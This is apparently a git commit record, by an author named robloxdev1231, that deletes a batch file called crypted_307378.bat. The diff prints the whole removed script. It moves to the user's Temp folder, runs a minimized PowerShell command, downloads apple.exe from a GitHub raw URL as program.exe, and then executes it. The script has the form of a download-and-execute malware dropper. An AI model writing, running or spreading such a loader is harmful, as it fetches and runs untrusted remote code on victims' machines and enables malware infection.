498a95d4b08fcc7b38e03d1599728fd6fc6dffed
robloxdev1231 <forveineddev123@outlook.com>
2025-12-01 15:31:28 -0500

    Delete crypted_307378.bat

--- crypted_307378.bat
+++
@@ -1,8 +0,0 @@
-@echo off
-cd /d %USERPROFILE%\AppData\Local\Temp
-REM 
-powershell -WindowStyle Minimized -Command "Start-Sleep -Milliseconds 100"
-REM 
-curl -L "https://github.com/robloxdev1231/ok/raw/refs/heads/main/apple.exe" -o "program.exe"
-REM
-program.exe
